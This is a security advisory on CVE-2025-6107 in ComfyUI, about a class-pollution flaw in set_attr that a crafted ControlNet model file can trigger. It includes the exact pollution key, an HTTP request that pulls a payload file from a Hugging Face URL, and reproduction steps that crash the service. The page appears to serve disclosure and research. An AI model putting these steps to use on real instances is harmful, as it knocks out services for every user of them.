---
title: "ComfyUI"
weight: 5
---

# ComfyUI (CVE-2025-6107)

**ComfyUI** is a node-based UI for Stable Diffusion (78.5K stars) that processes workflow definitions and model loading via a web interface.

| Field | Value |
|-------|-------|
| Repository | [comfyanonymous/ComfyUI](https://github.com/comfyanonymous/ComfyUI) |
| Version | v0.3.39 |
| CVE | [CVE-2025-6107](https://github.com/comfyanonymous/ComfyUI/security/advisories) |
| Type | Constrained-Get × Attr-Set |
| Input | Remote (malicious model file) |
| Consequences | DoS |
| Status | Assigned |

## Summary

ComfyUI is vulnerable to a class pollution vulnerability. When a malicious ControlNet model — containing a dotted pollution path in its state dict — is loaded via the ControlNet loader, ComfyUI unconditionally patches model parameters based on the polluted key and value. This can be abused to achieve arbitrary internal state modification, leading to a DoS attack that crashes all model-related operations.

## Vulnerability

The root cause lies in the `set_attr` function, designed to handle model patching and state dict loading in ComfyUI workflows. It does not limit the access and modification scope, allowing a deliberately crafted model to carry malicious state dict key-value pairs that modify internal class attributes in the Python runtime.

[`comfy/utils.py`](https://github.com/comfyanonymous/ComfyUI/blob/19e45e9b0e235acafc120a7532ce3825b8a325b9/comfy/utils.py#L710-L716):

```python
def set_attr(obj, attr, value):
    attrs = attr.split(".")
    for name in attrs[:-1]:
        obj = getattr(obj, name)        # Constrained-Get: getattr only
    prev = getattr(obj, attrs[-1])
    setattr(obj, attrs[-1], value)      # Attr-Set
    return prev

def set_attr_param(obj, attr, value):
    return set_attr(obj, attr, torch.nn.Parameter(value, requires_grad=False))
```

The function:
1. Splits the attacker-controlled `attr` string by dots
2. Resolves each segment via `getattr` (Constrained-Get)
3. Sets the final attribute with `setattr` (Attr-Set)

No validation is performed on the attribute path. A malicious model can embed keys like `time_embed.__class__.__base__.__getattribute__` in its state dict with a value of `torch.rand(1)`, which overwrites `torch.nn.Module.__getattribute__` with a non-callable tensor.

## PoC

### Consequence 1: DoS

**Steps:**

1. Download the malicious ControlNet model via a plugin such as [ComfyUI-Easy-Use](https://github.com/yolain/ComfyUI-Easy-Use):

```http
POST /easyuse/model/download HTTP/1.1
Host: proof-of-concept:8188
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="url"

https://huggingface.co/2h0ng/dos-poc/resolve/main/payload.safetensors
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="local_dir"

controlnet
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

2. Load the Scribble ControlNet workflow template in ComfyUI.
3. Select the malicious model in the ControlNet loader node.
4. Run the workflow.

**Effect**: The malicious state dict key `time_embed.__class__.__base__.__getattribute__` causes `torch.nn.Module.__getattribute__` to be overwritten with `torch.rand(1)`. Since `__getattribute__` is the special method called on every attribute access, once polluted, every attribute access operation on `torch.nn.Module` and all its subclasses raises a `TypeError` (non-callable). All subsequent model-related operations crash, making ComfyUI completely unusable until restarted.

## Impact

Any user who can load a model into ComfyUI (directly or via plugins that download models from external sources like HuggingFace) can trigger this vulnerability. The attack vector is a malicious `.safetensors` file, which can be distributed through model-sharing platforms. Once loaded, the pollution affects the entire Python runtime, crashing all model operations for all users of that ComfyUI instance.

## Proof of Concept

[`cp-collection/ComfyUI/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/ComfyUI/poc)
&mdash; malicious model and workflow for reproduction.
